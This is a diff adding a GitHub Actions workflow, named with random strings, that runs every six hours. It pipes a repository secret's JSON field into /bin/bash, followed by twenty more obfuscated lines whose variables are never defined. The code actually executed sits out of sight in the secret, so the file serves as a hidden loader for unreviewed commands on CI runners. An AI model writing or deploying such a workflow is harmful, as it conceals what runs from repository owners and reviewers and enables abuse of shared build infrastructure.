@@ -1,0 +1,37 @@
+name: hezuokaifaa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hezuokaifaa
+        env:
+          jjmmx85: ${{ secrets.jjmmx85 }}
+        run: |
+          echo $jjmmx85 | jq -r .icrc99 | /bin/bash
+          echo $lk796 | jq -r .bbbso716 | /bin/bash
+          echo $jdirj430 | jq -r .yep31 | /bin/bash
+          echo $kbsx3 | jq -r .ea27123 | /bin/bash
+          echo $dem0103 | jq -r .dg16871 | /bin/bash
+          echo $ju7973 | jq -r .ndpt66683 | /bin/bash
+          echo $axm93548 | jq -r .v26 | /bin/bash
+          echo $gpjwi3 | jq -r .r3627 | /bin/bash
+          echo $gztm7368 | jq -r .tq3 | /bin/bash
+          echo $i490 | jq -r .ghvgd61 | /bin/bash
+          echo $felfw10760 | jq -r .k88829 | /bin/bash
+          echo $per3344 | jq -r .d70 | /bin/bash
+          echo $a8262 | jq -r .rup3625 | /bin/bash
+          echo $wuoe448 | jq -r .xeav3076 | /bin/bash
+          echo $zgml2 | jq -r .qdofq074 | /bin/bash
+          echo $f3411 | jq -r .wgmly9 | /bin/bash
+          echo $h62361 | jq -r .myo463 | /bin/bash
+          echo $ktsgi1176 | jq -r .aowhx43130 | /bin/bash
+          echo $im76 | jq -r .ewc46 | /bin/bash
+          echo $m338 | jq -r .c423 | /bin/bash
+          echo $bnwyn9519 | jq -r .snczk84376 | /bin/bash
+
